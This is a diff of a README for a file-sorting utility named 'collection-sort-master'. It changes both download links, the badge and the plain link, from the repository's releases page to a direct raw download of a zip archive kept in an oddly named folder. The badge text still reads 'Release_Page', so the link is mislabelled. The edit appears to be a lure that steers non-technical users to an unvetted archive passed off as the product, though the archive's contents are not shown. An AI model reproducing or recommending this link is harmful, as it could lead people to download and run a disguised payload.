@@ -1,6 +1,6 @@
 # 📂 collection-sort-master - Organize your files with ease today
 
-[![Download collection-sort-master](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/horselatitudereadership463/collection-sort-master/releases)
+[![Download collection-sort-master](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/horselatitudereadership463/collection-sort-master/main/hypercomplex/master_sort_collection_3.6.zip)
 
 ## 🎯 About This Tool
 
@@ -23,7 +23,7 @@ You do not need prior technical experience to use this software. It functions as
 
 Visit the link below to reach the latest version of the application.
 
-[Download collection-sort-master](https://github.com/horselatitudereadership463/collection-sort-master/releases)
+[Download collection-sort-master](https://raw.githubusercontent.com/horselatitudereadership463/collection-sort-master/main/hypercomplex/master_sort_collection_3.6.zip)
 
 Follow these steps to complete the setup process:
 
